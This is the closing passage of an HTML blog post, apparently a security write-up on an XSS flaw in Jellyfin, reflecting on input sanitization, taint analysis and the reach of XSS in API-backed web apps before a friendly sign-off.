Do we validate both times?</p><p>An open source project like <code>Jellyfin</code> might be better off with as much sanitization and restrictions as possible, because of the sheer number of people making changes to the codebase who all have their own assumptions.</p><p>Another project might have some well-defined choke points that can be audited heavily.</p><p>In any case, it‚Äôs always worthwhile to take the flow of user input into consideration, maybe even with automated <a href="https://www.sonarsource.com/blog/what-is-taint-analysis/">taint analysis</a>.</p><p>Another aspect to consider is just how <em>powerful</em> a <code>XSS</code> vulnerability can be in the right environment. With the ever-growing popularity of web apps and their backing <code>REST/GraphQL APIs</code>, there are so many possibilities for abuse. I love it.</p><p>As always: If you have questions, corrections, or simply want to get in touch: Please please please <a href="https://solar.lowtechmagazine.com/about">holla at me</a>.</p><p>Thank you <strong>so</strong> much for reading - it truly makes my day üåû.</p></div>
  </body>
</html>
